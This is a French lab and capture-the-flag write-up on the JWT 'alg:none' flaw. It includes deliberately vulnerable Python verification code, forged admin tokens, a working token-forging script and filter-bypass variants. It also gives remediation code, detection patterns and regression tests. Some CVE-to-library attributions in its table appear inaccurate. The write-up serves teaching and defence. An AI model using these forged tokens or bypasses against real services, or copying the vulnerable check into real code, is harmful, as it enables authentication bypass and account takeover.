# Write-up : Exploitation de la vulnérabilité JWT `alg:none`

---

## Résumé exécutif

La vulnérabilité `alg:none` permet à un attaquant de forger des jetons JWT arbitraires sans connaître la clé de signature du serveur. Elle résulte d'une mauvaise implémentation côté serveur qui fait confiance au champ `alg` de l'en-tête JWT fourni par le client. Exploitée, elle conduit à une usurpation d'identité complète et à une escalade de privilèges, généralement jusqu'au rôle administrateur.

- **Sévérité** : Critique (CVSS 9.8)
- **CWE** : CWE-347 (Improper Verification of Cryptographic Signature)
- **Catégorie OWASP** : A02:2021 — Cryptographic Failures / A07:2021 — Identification and Authentication Failures
- **Impact** : Contournement total de l'authentification
- **Exploitabilité** : Triviale, aucune connaissance préalable requise

---

## 1. Rappel sur les JWT

Un JSON Web Token (RFC 7519) est composé de trois parties séparées par des points :

```
header.payload.signature
```

Chaque partie est encodée en base64url. Le header contient généralement deux champs :

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Le champ `alg` indique l'algorithme utilisé pour signer le jeton. Le standard RFC 7518 définit plusieurs algorithmes :

| Algorithme | Type | Description |
|------------|------|-------------|
| HS256 | HMAC | Signature symétrique avec SHA-256 |
| RS256 | RSA | Signature asymétrique avec SHA-256 |
| ES256 | ECDSA | Signature sur courbe elliptique |
| none | Aucun | Aucune signature |

Le standard autorise l'algorithme `none` pour des cas d'usage très spécifiques : lorsqu'un JWT est utilisé comme simple conteneur de données dans un canal déjà sécurisé, sans besoin d'intégrité cryptographique.

---

## 2. Mécanisme de la vulnérabilité

### 2.1 Principe

Lorsqu'un serveur reçoit un JWT, il doit vérifier sa signature avant de faire confiance à son contenu. Une implémentation naïve procède ainsi :

1. Lire le header du token
2. Extraire la valeur de `alg`
3. Vérifier la signature selon l'algorithme indiqué

Le problème survient lorsque le serveur fait confiance à la valeur `alg` fournie par le client. Un attaquant peut alors :

1. Modifier le header pour indiquer `"alg": "none"`
2. Modifier le payload pour élever ses privilèges
3. Supprimer la signature (la partie après le dernier point devient vide)

Le serveur, croyant que le token est légitimement non signé, accepte le payload sans aucune vérification.

### 2.2 Structure d'un token forgé

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

Décomposition :

- Header (base64url) : `{"alg":"none","typ":"JWT"}`
- Payload (base64url) : `{"sub":"1","role":"admin"}`
- Signature : vide

Le token se termine par un point, indiquant une signature de longueur nulle.

---

## 3. Contexte historique

Cette vulnérabilité a touché de nombreuses bibliothèques JWT populaires entre 2015 et 2018 :

| CVE | Bibliothèque | Année |
|-----|--------------|-------|
| CVE-2015-9235 | jsonwebtoken (Node.js) | 2015 |
| CVE-2016-5431 | php-jwt (PHP) | 2016 |
| CVE-2018-0114 | jose4j (Java) | 2018 |
| CVE-2016-10555 | jwt-simple (Node.js) | 2016 |

Dans la plupart des cas, la bibliothèque acceptait `alg:none` par défaut, ou ne l'excluait pas lorsqu'aucune liste d'algorithmes autorisés n'était fournie par le développeur.

---

## 4. Environnement du laboratoire

### 4.1 Application cible

L'application utilisée est un tableau de bord d'entreprise disposant de deux niveaux d'accès :

- Utilisateur standard (`role: user`) : accès au tableau de bord
- Administrateur (`role: admin`) : accès à un panneau interne protégé

### 4.2 Comptes de test

```
Utilisateur : alice / alice123  (role: user)
Administrateur : admin / admin123 (role: admin)
```

### 4.3 Endpoints

```
GET  /                  - Page de connexion
GET  /dashboard         - Tableau de bord utilisateur
POST /api/login         - Authentification
GET  /api/me            - Profil courant
GET  /api/admin/data    - Endpoint administrateur (vulnérable)
GET  /api/admin/secure  - Endpoint administrateur (sécurisé)
```

---

## 5. Analyse du code vulnérable

La fonction responsable de la faille est la suivante :

```python
def verifier_token_vulnerable(token, secret):
    header = jwt.get_unverified_header(token)
    alg = header.get("alg")

    if alg == "none":
        payload = jwt.decode(token, options={"verify_signature": False})
    else:
        payload = jwt.decode(token, secret, algorithms=[alg])
    return payload
```

Plusieurs anti-patterns sont identifiables :

1. Le champ `alg` est lu directement depuis le token
2. Un cas particulier est fait pour `"none"` avec désactivation explicite de la vérification
3. L'algorithme passé à `jwt.decode` est celui du client, non une constante serveur

Une variante également vulnérable, plus subtile :

```python
payload = jwt.decode(token, secret, algorithms=None)
```

Ici, l'absence de la liste `algorithms` amène certaines bibliothèques à accepter n'importe quel algorithme, y compris `none`.

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte utilisateur standard.

```
POST /api/login
Content-Type: application/json

{"username":"alice","password":"alice123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5OTk5OTk5LCJleHAiOjE3MjAwMDM1OTl9.4xY8Hn...
```

Décodage du payload :

```json
{
  "sub": "1",
  "username": "alice",
  "role": "user",
  "iat": 1719999999,
  "exp": 1720003599
}
```

### 6.2 Test initial

Tentative d'accès à l'endpoint administrateur avec le token légitime :

```
GET /api/admin/data
Cookie: token=<token légitime>
```

Réponse :

```
HTTP/1.1 403 Forbidden
{"ok": false, "error": "Accès refusé"}
```

Le comportement est conforme : le rôle `user` ne permet pas l'accès.

### 6.3 Modification du token

Le token est décomposé en trois parties. Le header est remplacé par une version avec `alg:none` et le payload est modifié pour inclure `role:admin`.

Header forgé :

```json
{"alg":"none","typ":"JWT"}
```

Payload forgé :

```json
{"sub":"1","username":"alice","role":"admin"}
```

Encodage base64url de chaque partie :

```
Header  : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload : eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9
Signature : (vide)
```

Token final :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

### 6.4 Script d'exploitation

Un script Python minimal permet d'automatiser la génération :

```python
import base64
import json

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forger_token(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = base64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."

payload = {
    "sub": "1",
    "username": "alice",
    "role": "admin"
}

print(forger_token(payload))
```

### 6.5 Injection et accès

Envoi du token forgé :

```
GET /api/admin/data
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{n0n3_4lg_1s_4_w34p0n}",
    ...
  }
}
```

L'accès administrateur est accordé avec un token entièrement forgé, sans connaissance de la clé secrète.

### 6.6 Vérification sur l'endpoint corrigé

Le même token envoyé sur l'endpoint sécurisé :

```
GET /api/admin/secure
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Algorithme non autorisé"}
```

Le correctif bloque l'exploitation.

---

## 7. Variantes d'exploitation

### 7.1 Casse de l'algorithme

Certaines bibliothèques sont sensibles à la casse. Des variantes comme `None`, `NONE`, `nOnE` peuvent contourner des filtres naïfs qui comparent uniquement à la chaîne `"none"`.

### 7.2 Espace dans le header

```
{"alg":"none ","typ":"JWT"}
```

Certains parseurs suppriment les espaces avant comparaison.

### 7.3 Tableau au lieu de chaîne

```
{"alg":["none"],"typ":"JWT"}
```

Certains parseurs acceptent un tableau et prennent la première valeur.

### 7.4 Signature vide vs signature supprimée

Selon les implémentations, il peut être nécessaire de :

- Terminer le token par un point (`header.payload.`)
- Omettre complètement le point final (`header.payload`)
- Fournir une chaîne vide comme signature

Ces variantes doivent être testées lors de la phase d'exploitation.

---

## 8. Conditions d'exploitation

Pour que la vulnérabilité soit exploitable, les conditions suivantes doivent être réunies :

| Condition | Description |
|-----------|-------------|
| Lecture du header | Le serveur extrait `alg` du token |
| Absence de whitelist | Aucune liste d'algorithmes autorisés n'est fournie |
| Acceptation de `none` | L'algorithme `none` n'est pas explicitement rejeté |
| Claims sensibles | Le payload contient des données d'autorisation (rôle, permissions) |
| Route accessible | L'attaquant peut atteindre une fonctionnalité protégée |

---

## 9. Remédiation

### 9.1 Principe directeur

Le serveur ne doit jamais faire confiance au champ `alg` du token. Il doit imposer l'algorithme attendu.

### 9.2 Code corrigé

```python
import jwt

ALLOWED_ALGORITHMS = ["HS256"]

def verifier_token_securise(token, secret):
    payload = jwt.decode(
        token,
        secret,
        algorithms=ALLOWED_ALGORITHMS,
        options={"require": ["exp", "sub"]}
    )
    return payload
```

Points clés :

- La liste `algorithms` est une constante serveur
- Aucune mention de `"none"` ni de lecture du header
- Les claims `exp` et `sub` sont obligatoires

### 9.3 Règles défensives complémentaires

| Mesure | Description |
|--------|-------------|
| Whitelist stricte | Autoriser uniquement les algorithmes utilisés en production |
| Signature obligatoire | Rejeter tout token sans signature |
| Claims obligatoires | Exiger `exp`, `iat`, `sub` |
| Validation de l'émetteur | Vérifier `iss` et `aud` |
| Secret robuste | Utiliser au moins 256 bits d'entropie pour HS256 |
| Rotation des clés | Renouveler régulièrement les secrets |
| Tests automatisés | Ajouter des tests de non-régression pour la vérification de signature |
| Audit du code | Rechercher les patterns `verify=False`, `algorithms=None`, lecture du header |

### 9.4 Détection par analyse statique

Quelques patterns à rechercher dans une base de code :

```
jwt.decode(..., verify=False)
jwt.decode(..., algorithms=None)
jwt.get_unverified_header(token)
options={"verify_signature": False}
algorithms=[header.get("alg")]
algorithms=[token_header["alg"]]
```

Toute occurrence doit être auditée.

---

## 10. Tests de non-régression

Les tests suivants doivent accompagner le correctif :

```python
def test_alg_none_rejete(client):
    token = forger_token({"sub": "1", "role": "admin"})
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_signature_invalide_rejetee(client):
    token = jwt.encode({"sub": "1", "role": "admin"},
                       "mauvaise-cle", algorithm="HS256")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_signature_valide_acceptee(client):
    token = jwt.encode({"sub": "1", "role": "admin"},
                       SECRET, algorithm="HS256")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 200
```

---

## 11. Impact métier

L'exploitation de cette vulnérabilité permet à un attaquant :

- D'accéder à des fonctionnalités réservées aux administrateurs
- De lire, modifier ou supprimer des données sensibles
- D'usurper l'identité de n'importe quel utilisateur
- De contourner l'ensemble du contrôle d'accès de l'application
- D'utiliser l'application comme point d'entrée vers d'autres systèmes internes

Dans un contexte de production, l'impact peut inclure une fuite de données personnelles (RGPD), une compromission de comptes privilégiés, ou une atteinte à l'intégrité des données métier.

---

## 12. Conclusion

La vulnérabilité `alg:none` illustre un principe fondamental de sécurité applicative : un composant ne doit jamais dicter ses propres règles de vérification. Un JWT est une preuve d'identité conditionnée à une signature cryptographique valide. Accepter un token non signé revient à supprimer toute garantie d'authenticité.

Le correctif est trivial (imposer `algorithms=["HS256"]` ou équivalent) mais doit être appliqué systématiquement. Une simple revue de code recherchant les patterns vulnérables permet d'éliminer cette classe de faille dans la majorité des applications.

En complément, l'adoption d'algorithmes asymétriques (RS256, ES256) réduit la surface d'attaque en supprimant le secret symétrique que les attaquants peuvent tenter de deviner ou de cracker.

---

## Références

- RFC 7519 — JSON Web Token (JWT)
- RFC 7518 — JSON Web Algorithms (JWA)
- OWASP JSON Web Token Cheat Sheet
- PortSwigger Web Security Academy — JWT attacks
- CVE-2015-9235, CVE-2016-5431, CVE-2018-0114
- CWE-347 : Improper Verification of Cryptographic Signature